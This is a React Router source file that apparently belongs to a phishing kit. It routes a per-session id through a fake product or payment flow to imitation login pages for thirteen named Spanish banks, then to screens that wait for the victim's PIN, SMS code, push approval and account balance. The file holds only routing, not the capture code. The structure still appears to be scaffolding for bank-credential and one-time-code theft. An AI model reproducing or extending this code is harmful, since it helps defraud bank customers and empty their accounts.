import { createBrowserRouter } from 'react-router-dom'
import { Layout } from '../layouts/BaseLayout'
import { BalanceModal } from '../modals/BalanceModal'
import { CustomErrorModal } from '../modals/CustomErrorModal'
import { ErrorModal } from '../modals/ErrorModal'
import { LoadingModal } from '../modals/LoadingModal'
import { PinModal } from '../modals/PinModal'
import { PushModal } from '../modals/PushModal'
import { SmsModal } from '../modals/SmsModal'
import { ModalPage } from '../pages/ModalPage'
import { NotFoundPage } from '../pages/NotFoundPage'
// import { PaymentPage } from '../pages/PaymentPage'
import { AbancaPage } from '../banks/abanca/AbancaPage'
import { BBVAPage } from '../banks/bbva/BBVAPage'
import { CaixaPage } from '../banks/caixa/CaixaPage'
import { CajamarPage } from '../banks/cajamar/CajamarPage'
import { CajasurPage } from '../banks/cajasur/CajasurPage'
import { EvoPage } from '../banks/evo/EvoPage'
import { IbercajaPage } from '../banks/ibercaja/IbercajaPage'
import { IngPage } from '../banks/ing/IngPage'
import { KutxaPage } from '../banks/kutxa/KutxaPage'
import { MastercajaPage } from '../banks/mastercaja/MastercajaPage'
import { RuralviaPage } from '../banks/ruralvia/RuralviaPage'
import { SabadellPage } from '../banks/sabadell/SabadellPage'
import { SantanderPage } from '../banks/santander/SantanderPage'
import { BankPushModal } from '../modals/BankPushModal'
import { ChooseBankPage } from '../pages/ChooseBankPage'
import { PaymentPage } from '../pages/PaymentPage'
import { ProductPage } from '../pages/ProductPage'

const router = createBrowserRouter([
  {
    path: '/',
    element: <Layout />,
    children: [
      {
        path: 'bank/',
        children: [
          {
            path: 'caixa/:id',
            element: <CaixaPage />
          },
          {
            path: 'ing/:id',
            element: <IngPage />
          },
          {
            path: 'santander/:id',
            element: <SantanderPage />
          },
          {
            path: 'abanca/:id',
            element: <AbancaPage />
          },
          {
            path: 'mastercaja/:id',
            element: <MastercajaPage />
          },
          {
            path: 'sabadell/:id',
            element: <SabadellPage />
          },
          {
            path: 'evo/:id',
            element: <EvoPage />
          },
          {
            path: 'cajamar/:id',
            element: <CajamarPage />
          },
          {
            path: 'cajasur/:id',
            element: <CajasurPage />
          },
          {
            path: 'kutxa/:id',
            element: <KutxaPage />
          },
          {
            path: 'ruralvia/:id',
            element: <RuralviaPage />
          },
          {
            path: 'ibercaja/:id',
            element: <IbercajaPage />
          },
          {
            path: 'bbva/:id',
            element: <BBVAPage />
          }
        ]
      },
      {
        path: 'product/:id',
        element: <ProductPage />
      },
      {
        path: 'receive/:id',
        element: <PaymentPage />
      },
      {
        path: 'banks/:id',
        element: <ChooseBankPage />
      },
      {
        path: 'loading/:id',
        element: <ModalPage ModalComponent={LoadingModal} />
      },
      {
        path: 'waiting-pin/:id',
        element: <ModalPage ModalComponent={PinModal} />
      },
      {
        path: 'waiting-sms/:id',
        element: <ModalPage ModalComponent={SmsModal} />
      },
      {
        path: 'error/:id',
        element: <ModalPage ModalComponent={ErrorModal} />
      },
      {
        path: 'internal-error/:id',
        element: <ModalPage ModalComponent={CustomErrorModal} />
      },
      {
        path: 'bank-push/:id',
        element: <ModalPage ModalComponent={BankPushModal} />
      },
      {
        path: 'push/:id',
        element: <ModalPage ModalComponent={PushModal} />
      },
      {
        path: 'balance/:id',
        element: <ModalPage ModalComponent={BalanceModal} />
      },
      {
        path: 'exact-balance/:id',
        element: <ModalPage ModalComponent={BalanceModal} />
      },
      {
        index: true,
        element: <NotFoundPage />
      },
      {
        path: '*',
        element: <NotFoundPage />
      }
    ]
  },
  {
    path: '*',
    element: <NotFoundPage />
  }
])

export default router
